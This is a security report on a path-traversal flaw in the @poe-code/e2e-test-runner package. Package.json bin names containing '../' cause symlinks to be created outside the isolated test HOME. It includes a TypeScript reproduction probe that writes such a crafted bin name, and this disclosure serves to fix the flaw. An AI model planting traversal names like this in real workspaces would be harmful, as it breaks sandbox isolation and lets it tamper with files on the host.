# E2E test runner accepts package-bin name path traversal and creates a symlink outside isolated HOME

## Summary

`@poe-code/e2e-test-runner` preflight uses each `package.json` `bin` map key as a filename under its isolated `HOME/.local/bin` directory without validating it. A crafted binary name containing `../` segments causes startup to create a symlink outside the temporary HOME boundary.

## Reproduction

1. From the repository root, save this disposable probe as `probe.mts`:

   ```ts
   import fs from "node:fs/promises";
   import os from "node:os";
   import path from "node:path";
   import { createHostContainer } from "./packages/e2e-test-runner/src/host-container.ts";
   import { setWorkspaceDir } from "./packages/e2e-test-runner/src/runtime.ts";

   const root = await fs.mkdtemp(path.join(os.tmpdir(), "poe-e2e-bin-name-"));
   const project = path.join(root, "project");
   const externalLink = path.join(root, "created-link");
   const escapedName = `../../../${path.basename(root)}/created-link`;

   await fs.mkdir(path.join(project, "bin"), { recursive: true });
   await fs.writeFile(path.join(project, "bin", "probe"), "#!/bin/sh\nexit 0\n", {
     mode: 0o700
   });
   await fs.writeFile(
     path.join(project, "package.json"),
     JSON.stringify({ name: "probe", bin: { [escapedName]: "bin/probe" } }),
     "utf8"
   );

   setWorkspaceDir(project);
   process.env.POE_API_KEY = "fake";
   const container = await createHostContainer({}, () => ({ bin: "true", args: [] }));
   try {
     await container.exec("true");
     console.log(await fs.readlink(externalLink));
   } finally {
     await container.destroy();
   }
   ```

2. Execute it with `./node_modules/.bin/tsx ./probe.mts`.

## Observed Behavior

After `container.exec()` triggers preflight, `created-link` exists beside the project and is a symlink to `project/bin/probe`. The symlink is created outside the generated container HOME even though bin linking is intended to populate only `HOME/.local/bin`.

`linkRootPackageBins()` enumerates workspace-controlled `package.json` bin names and calls `symlink(target, join(localBinDir, name))` in `packages/e2e-test-runner/src/host-container.ts:191`. Since `name` is unchecked, `join()` normalizes traversal segments into an arbitrary external destination.

## Expected Behavior

Package binary names should be treated as simple executable basenames, and preflight-created links should be confined to the isolated `HOME/.local/bin` directory.

## Impact

A crafted workspace can cause E2E startup to create or overwrite symlink entries outside its temporary HOME directory. This breaks test isolation and provides a filesystem mutation primitive against accessible paths on the host running the tests.
